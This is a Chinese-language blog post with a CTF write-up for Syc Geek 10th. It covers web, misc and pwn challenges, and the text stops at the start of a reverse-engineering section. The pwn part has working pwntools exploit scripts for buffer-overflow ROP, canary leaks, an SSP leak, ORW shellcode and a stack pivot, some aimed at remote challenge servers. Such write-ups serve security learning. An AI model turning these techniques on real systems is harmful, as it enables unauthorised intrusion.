<!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"><link rel="stylesheet" href="/css/main.css?v=7.1.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/xintiao_32.png?v=7.1.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/xintiao_16.png?v=7.1.0"><link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222"><link rel="manifest" href="/images/manifest.json"><meta name="msapplication-config" content="/images/browserconfig.xml"><script id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"7.1.0",sidebar:{position:"left",display:"post",offset:12,onmobile:!1,dimmer:!1},back2top:!0,back2top_sidebar:!0,fancybox:!1,fastclick:!1,lazyload:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta property="og:type" content="article"><meta property="og:title" content="Syc Geek 10th"><meta property="og:url" content="http://liul14n.top/2019/10/31/Syc-Geek-10th/index.html"><meta property="og:site_name" content="LiuLian"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/71.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191031203312.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118201005.png"><meta property="og:image" content="c:%5CUsers%5CLiuLian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200520215634462.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191101073212.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191101074059.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191110213533.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230117.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230604.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118230736.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191110221904.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122183221.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122183403.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122191218.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122191335.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/aaaaa.jpg"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122192519.png"><meta property="og:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191122193445.png"><meta property="og:updated_time" content="2020-05-20T14:29:40.137Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Syc Geek 10th"><meta name="twitter:image" content="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/71.png"><link rel="canonical" href="http://liul14n.top/2019/10/31/Syc-Geek-10th/"><script id="page.configurations">CONFIG.page={sidebar:""}</script><title>Syc Geek 10th | LiuLian</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">LiuLian</span> <span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-toggle"><button aria-label="切换导航栏"><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档<span class="badge">58</span></a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://liul14n.top/2019/10/31/Syc-Geek-10th/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="LiuLian"><meta itemprop="description" content="Salute The Time"><meta itemprop="image" content="/images/touxiang.jpeg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="LiuLian"></span><header class="post-header"><h2 class="post-title" itemprop="name headline">Syc Geek 10th</h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2019-10-31 20:27:34" itemprop="dateCreated datePublished" datetime="2019-10-31T20:27:34+08:00">2019-10-31</time> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-05-20 22:29:40" itemprop="dateModified" datetime="2020-05-20T22:29:40+08:00">2020-05-20</time> </span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span> </span><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-eye"></i> 阅读次数： <span class="busuanzi-value" id="busuanzi_value_page_pv"></span></span><div class="post-symbolscount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i> </span><span class="post-meta-item-text">本文字数：</span> <span title="本文字数">81k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">1:08</span></div></div></header><div class="post-body" itemprop="articleBody"><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/71.png" alt></p><a id="more"></a><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=450041229&auto=1&height=66"></iframe>---------------------<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>第十届极客大挑战结束了,感谢Syc的师傅们,赛题质量很高!学到了很多东西!</li><li>菜是原罪！</li></ul><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x01-打比赛前先撸一只猫"><a href="#0x01-打比赛前先撸一只猫" class="headerlink" title="0x01 打比赛前先撸一只猫"></a>0x01 打比赛前先撸一只猫</h2><ul><li>不是web选手,但是基本的get传参之类的还是会的。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191031203312.png" alt></p><ul><li><p>查看源码发现了这个假的flag。</p></li><li><p>直接get传参<code>?get=dog</code> 构造成<code>http://118.25.14.40:8110/?cat=dog</code>这种形式即可得到真正的flag。</p></li></ul><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="0x01-签到"><a href="#0x01-签到" class="headerlink" title="0x01 签到"></a>0x01 签到</h2><ul><li>签到,关注公众号即可签到拿flag。</li></ul><h2 id="0x02-我好兴奋啊"><a href="#0x02-我好兴奋啊" class="headerlink" title="0x02 我好兴奋啊"></a>0x02 我好兴奋啊</h2><ul><li>十六进制打开,搜索<code>Syc{</code>就能找到flag。</li></ul><h2 id="0x03-翻过这座山"><a href="#0x03-翻过这座山" class="headerlink" title="0x03 翻过这座山"></a>0x03 翻过这座山</h2><ul><li>在所给链接的github里面,有一个教翻墙的详细教程。而且里面有个注意事项,但是里面是假的flag, 真正的flag通过找这个翻墙项目的回收站(大概可以这么叫吧),里面有个flag.md,真正的flag在里面。</li></ul><h2 id="0x04-散打黑客的压缩包"><a href="#0x04-散打黑客的压缩包" class="headerlink" title="0x04 散打黑客的压缩包"></a>0x04 散打黑客的压缩包</h2><ul><li>两次爆破压缩包即可得到flag。</li></ul><h2 id="0x05-是谁杀了谁"><a href="#0x05-是谁杀了谁" class="headerlink" title="0x05 是谁杀了谁"></a>0x05 是谁杀了谁</h2><ul><li>这道题目我直接dnSpy动态调试拿到flag。</li><li>或者解那个DES(我是没解出来..)</li><li>官方WP如下:</li></ul><blockquote><p>exe的逻辑如下 按钮点第一次 –&gt; 生成一个HP的隐藏文件（注意要在“我的电脑”里面勾选隐藏文件选项）<br>按钮点第二次 –&gt; 往HP文件里面写入flag<br>按钮点第三次 –&gt; 删除HP文件里面的flag<br>按钮点第四次 –&gt; 删除HP文件<br>原本出题的时候打算加壳，防止被逆向。后来想想可以多给一条路，于是没有加壳。所以逆 向选手也可以直接逆向分析。</p></blockquote><h2 id="0x06-嘿-你喜欢吃鲱鱼罐头么"><a href="#0x06-嘿-你喜欢吃鲱鱼罐头么" class="headerlink" title="0x06 嘿,你喜欢吃鲱鱼罐头么?"></a>0x06 嘿,你喜欢吃鲱鱼罐头么?</h2><ul><li><p>破伪加密拿到图片,详细信息里面给了提示<code>它看起来像死鱼一样</code>,图片末尾有一串oids串<code>iisiiiisiiiiiiiiiiiiiiiiiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddoiiodddoioioddoddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiooddddoiiiiiodddddddoddddddddoiiiiiiiiiioiiiiiiiiiioddddddddddddddddddddoiiiiioiodddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddoiiiiiiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddoiiiiiiiiiio</code></p></li><li><p>根据提示,这和鲱鱼有关系, 最后了解到有一种编码叫deadfish编码。</p></li><li><p>官方WP提供了解密网站:</p></li></ul><p><a href="https://www.dcode.fr/deadfish-language" target="_blank" rel="noopener">解密网站</a></p><ul><li>自己写解密脚本也不难, O 表示输出(output), s表示平方(square),d表示减(dec),i表示(inc),解密脚本如下:</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> s = <span class="string">"iisiiiisiiiiiiiiiiiiiiiiiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddoiiodddoioioddoddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiooddddoiiiiiodddddddoddddddddoiiiiiiiiiioiiiiiiiiiioddddddddddddddddddddoiiiiioiodddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddoiiiiiiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddoiiiiiiiiiio"</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'i'</span>)&#123;</span><br><span class="line">            sum+=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'s'</span>)&#123;</span><br><span class="line">            sum=sum*sum;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'d'</span>)&#123;</span><br><span class="line">            sum-=<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'o'</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,sum);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x07-我也想成为r1ngs"><a href="#0x07-我也想成为r1ngs" class="headerlink" title="0x07 我也想成为r1ngs"></a>0x07 我也想成为r1ngs</h2><ul><li>hex转ascii以后是flag的立体字。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20191118201005.png" alt></p><ul><li>真有新意。</li></ul><h2 id="0x08-早点睡"><a href="#0x08-早点睡" class="headerlink" title="0x08 早点睡"></a>0x08 早点睡</h2><ul><li>脑洞太大,官方WP如下:</li></ul><blockquote><p>这题出的太智障了，原本都不打算放的… 首先010查看发现这是个psd文件，先把文件后缀改为psd。 然后用ps或者其他类似软件打开，可以看到有一个隐藏图层。里面有个链接。 访问之后下载到第二部分，利用base64转图片可以得到第二个链接。 访问之后下载到第三部分，利用base64转图片可以得到第三个链接。 访问之后下载到第四部分，利用base64转图片发现转不出来了，观察下数据，发现是一段 base64很有规律的重复，将重复的base64提取出来然后解base64就得到了flag。</p></blockquote><h2 id="0x09-RPG真是太好玩了吧"><a href="#0x09-RPG真是太好玩了吧" class="headerlink" title="0x09 RPG真是太好玩了吧"></a>0x09 RPG真是太好玩了吧</h2><ul><li>我这边一直打不开,也就没法做了。</li><li>官方WP说题目没啥难度,打通关就能拿到flag。而且为了防止CE修改破坏游戏体验,设置了当 任意人物到达30级时会出线变态怪物的设定.但是忘记加异常状态抗性了,很轻松就被打死了, 这算一个非预期吧.。</li></ul><h2 id="0x10-I-wanna-be-a-geek"><a href="#0x10-I-wanna-be-a-geek" class="headerlink" title="0x10 I wanna be a geek"></a>0x10 I wanna be a geek</h2><ul><li>每次修改save文件即可跳关。 flag在背景图上。</li></ul><h2 id="0x11-游戏玩累了-不如来听听歌吧"><a href="#0x11-游戏玩累了-不如来听听歌吧" class="headerlink" title="0x11 游戏玩累了 不如来听听歌吧"></a>0x11 游戏玩累了 不如来听听歌吧</h2><ul><li>做的时候忽略了题目的含义<code>吉良吉影发动了败者食尘！时间开始倒流了!</code>。看了WP知道需要倒放(从后往前分析)。</li><li>倒放后在开头有摩斯编码,解码得到flag。</li></ul><h2 id="0x12-马里奥真是太有趣了"><a href="#0x12-马里奥真是太有趣了" class="headerlink" title="0x12 马里奥真是太有趣了"></a>0x12 马里奥真是太有趣了</h2><ul><li>参考官方WP:</li></ul><blockquote><p>下载下来是个nes后缀的文件，下载nes模拟器打开发现是初代SMB<br>游玩过了一世界库巴后会告诉你flag在8-4。直接金手指跳到8-4，从水关回来就是flag。</p></blockquote><h2 id="0x13-The-final"><a href="#0x13-The-final" class="headerlink" title="0x13 The final"></a>0x13 The final</h2><ul><li>师傅们tql! wp见师傅们给的wp:</li></ul><p><a href="https://github.com/LambGod/Syc-Geek-10th-Misc-The-final" target="_blank" rel="noopener">WP传送门</a></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="0x01-Find-tools"><a href="#0x01-Find-tools" class="headerlink" title="0x01 Find tools"></a>0x01 Find tools</h2><ul><li>pwntools远程拿到key,base64解码,然后send, 注意要interactive,不然拿不到flag。</li></ul><h2 id="0x02-BabyROP"><a href="#0x02-BabyROP" class="headerlink" title="0x02 BabyROP"></a>0x02 BabyROP</h2><ul><li>简单ROP,但官方WP说有小坑???</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>	*	</span><br><span class="line">p = remote(<span class="string">'pwnto.fun'</span>,<span class="number">10000</span>)</span><br><span class="line">payload	= <span class="string">'a'</span>*<span class="number">0x88</span> + p64(<span class="number">0x400618</span>) </span><br><span class="line">p.sendline(payload)	</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x03-Babyshellcode"><a href="#0x03-Babyshellcode" class="headerlink" title="0x03 Babyshellcode"></a>0x03 Babyshellcode</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch: amd64-64-little</span><br><span class="line">RELRO: Full RELRO</span><br><span class="line">Stack: No canary found</span><br><span class="line">NX: NX enabled</span><br><span class="line">PIE: No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><img src="C:%5CUsers%5CLiuLian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200520215634462.png" alt="image-20200520215634462"></p><p>开了seccomp，通过seccomp-tools查看可知允许Open read write，所以采用ORW</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./RushB"</span>)</span><br><span class="line"></span><br><span class="line">buf_addr=<span class="number">0x123000</span></span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.amd64.pushstr(<span class="string">'./flag'</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_open'</span>,<span class="string">"rsp"</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_read'</span>,<span class="string">"rax"</span>, <span class="number">0x123500</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>, <span class="number">0x123500</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">sh.recvuntil(<span class="string">"A simple shellcode for U, have fun!"</span>)</span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.recvuntil(<span class="string">"Why not play CSGO?"</span>)</span><br><span class="line">sh.sendline(<span class="string">'A'</span>*<span class="number">0x38</span>+p64(buf_addr))</span><br><span class="line">print(sh.recv())</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><h2 id="0x04-EasyCanary"><a href="#0x04-EasyCanary" class="headerlink" title="0x04 EasyCanary"></a>0x04 EasyCanary</h2><ul><li>泄露Canary。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = remote('pwnto.fun',10001)</span></span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./canary'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c,'b fun')</span></span><br><span class="line"></span><br><span class="line">systemaddr = <span class="number">0x08048647</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line">c.send(payload)</span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line">s = c.recv()</span><br><span class="line"></span><br><span class="line">canary = u32(<span class="string">'\x00'</span>+s[<span class="number">21</span>:<span class="number">24</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'canary = '</span> + hex(canary))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>* <span class="number">20</span></span><br><span class="line">payload2 += p32(canary)</span><br><span class="line">payload2 += <span class="string">'a'</span>*<span class="number">12</span></span><br><span class="line">payload2 += p32(systemaddr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload2)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x05-BabyCanary"><a href="#0x05-BabyCanary" class="headerlink" title="0x05 BabyCanary"></a>0x05 BabyCanary</h2><ul><li>SSP Leak</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'pwnto.fun'</span>,<span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">c.recvline()</span><br><span class="line"></span><br><span class="line">bufaddr = c.recvline()[<span class="number">18</span>:]</span><br><span class="line"></span><br><span class="line">addr = int(bufaddr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(addr)*<span class="number">250</span></span><br><span class="line"></span><br><span class="line">c.recvline()</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> c.recvline()</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x06-not-bad"><a href="#0x06-not-bad" class="headerlink" title="0x06 not bad"></a>0x06 not bad</h2><p>相比babyshellcode，多了栈迁移，依旧是ORW</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch: amd64-64-little</span><br><span class="line">RELRO: Partial RELRO</span><br><span class="line">Stack: No canary found</span><br><span class="line">NX: NX disabled</span><br><span class="line">PIE: No PIE (0x400000)</span><br><span class="line">RWX: Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sh = process(<span class="string">"./bad"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.amd64.pushstr(<span class="string">'./flag'</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_open'</span>,<span class="string">"rsp"</span>, <span class="number">0</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_read'</span>,<span class="string">"rax"</span>, <span class="number">0x123500</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode += shellcraft.amd64.linux.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>, <span class="number">0x123500</span>,<span class="number">40</span>).rstrip()</span><br><span class="line">shellcode  = asm(shellcode)</span><br><span class="line"></span><br><span class="line">jmp_rsp = <span class="number">0x0000000000400a01</span></span><br><span class="line"></span><br><span class="line">payload  = <span class="string">""</span></span><br><span class="line">payload += asm(<span class="string">"mov rax,rsp;add rax,0x18"</span>,arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>)</span><br><span class="line">payload += asm(shellcraft.amd64.linux.syscall(<span class="string">'SYS_read'</span>,<span class="number">0</span>,<span class="string">"rax"</span>,<span class="number">0x60</span>).rstrip())</span><br><span class="line">payload  = payload.ljust(<span class="number">0x20</span>,<span class="string">'\x90'</span>) <span class="comment"># padding</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># fake_ebp</span></span><br><span class="line">payload += p64(jmp_rsp)</span><br><span class="line">payload += asm(<span class="string">"sub rsp,0x30;jmp rsp"</span>,arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>).ljust(<span class="number">8</span>,<span class="string">'\x90'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Easy shellcode, have fun!"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line">print(sh.recv())</span><br><span class="line">print(sh.recv())</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="0x01-Jiang’s-fan"><a href="#0x01-Jiang’s-fan" class="headerlink" title="0x01 Jiang’s fan"></a>0x01 Jiang’s fan</h2><ul><li>签到题目,IDA打开就能看到flag</li></ul><h2 id="0x02-secret"><a href="#0x02-secret" class="headerlink" title="0x02 secret"></a>0x02 